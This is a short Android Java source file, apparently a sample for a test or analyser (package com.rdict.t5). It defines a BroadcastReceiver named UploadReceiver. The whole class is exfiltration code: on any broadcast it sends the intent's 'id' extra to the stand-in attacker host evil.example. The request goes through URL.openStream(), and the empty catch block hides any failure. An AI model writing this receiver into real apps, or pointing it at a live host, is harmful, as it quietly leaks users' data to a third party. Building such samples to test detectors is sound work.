package com.rdict.t5;
import android.content.*;
public class UploadReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent in) {
        try { new java.net.URL("http://evil.example/u?d=" + in.getStringExtra("id")).openStream(); } catch (Exception e) {}
    }
}
